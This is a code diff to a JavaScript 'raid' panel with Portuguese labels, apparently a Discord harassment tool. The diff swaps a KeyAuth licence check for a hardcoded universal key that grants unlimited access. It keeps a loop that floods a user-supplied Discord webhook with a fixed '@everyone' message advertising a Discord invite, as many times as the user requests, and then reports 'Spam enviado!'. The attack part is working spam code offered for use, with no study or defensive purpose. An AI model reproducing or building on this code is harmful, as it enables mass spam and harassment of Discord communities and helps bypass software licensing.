@@ -1,8 +1,5 @@
-const KeyAuthApp = new KeyAuth({
-  name: "PAINEL FHX TEAM",
-  ownerid: "Ngs25UE5fj",
-  version: "1.0"
-});
+const KEY_UNIVERSAL = "bytonymelivzmontop";
+const MENSAGEM_FIXA = "@everyone By Tony_Dev Entrem: https://discord.gg/xpXJkjDbmv";
 
 function toast(mensagem, tempo = 3000) {
   const toast = document.getElementById("toast");
@@ -12,17 +9,17 @@ function toast(mensagem, tempo = 3000) {
 }
 
 function verificarKey() {
-  const usuario = document.getElementById("username").value;
-  const key = document.getElementById("keyInput").value;
+  const usuario = document.getElementById("username").value.trim();
+  const key = document.getElementById("keyInput").value.trim();
 
   if (!usuario || !key) return toast("❗ Preencha todos os campos.");
 
-  KeyAuthApp.login(usuario, key)
-    .then((res) => {
-      if (res.success) abrirRaid(res.info);
-      else toast("❌ Login inválido.");
-    })
-    .catch(() => toast("❌ Erro na conexão com KeyAuth."));
+  if (key === KEY_UNIVERSAL) {
+    abrirRaid({ username: usuario, subscriptions: [{ expiry: 9999999999 }] });
+    toast("✅ Login universal ativado!");
+  } else {
+    toast("❌ Key inválida.");
+  }
 }
 
 function abrirRaid(info) {
@@ -30,34 +27,27 @@ function abrirRaid(info) {
   document.getElementById("telaRaid").style.display = "block";
 
   document.getElementById("userInfo").innerText = info.username || "Desconhecido";
-  document.getElementById("diasRestantes").innerText = info.subscriptions[0].expiry
-    ? calcularDias(info.subscriptions[0].expiry)
-    : "Ilimitado";
-
-  toast("✅ Login bem-sucedido!", 2500);
-}
-
-function calcularDias(expiryTimestamp) {
-  const agora = Math.floor(Date.now() / 1000);
-  const segundosRestantes = expiryTimestamp - agora;
-  const dias = Math.floor(segundosRestantes / 86400);
-  return dias >= 0 ? dias + " dias" : "Expirada";
+  document.getElementById("diasRestantes").innerText = "Ilimitado";
 }
 
 function enviarRaid() {
-  const webhook = document.getElementById("webhookRaid").value;
-  const msg = document.getElementById("mensagemRaid").value;
+  const webhook = document.getElementById("webhookRaid").value.trim();
   const quant = parseInt(document.getElementById("quantidadeRaid").value);
 
-  if (!webhook || !msg || isNaN(quant)) return toast("❗ Preencha todos os campos!");
+  if (!webhook || isNaN(quant)) return toast("❗ Preencha todos os campos!");
 
   for (let i = 0; i < quant; i++) {
     fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: msg })
+      body: JSON.stringify({ content: MENSAGEM_FIXA })
     }).catch((err) => console.log("Erro:", err));
   }
 
   toast("✅ Spam enviado!");
 }
+
+// Botão "Get Key" abre o Discord numa nova aba
+document.getElementById("btnGetKey").addEventListener("click", () => {
+  window.open("https://discord.gg/xpXJkjDbmv", "_blank");
+});
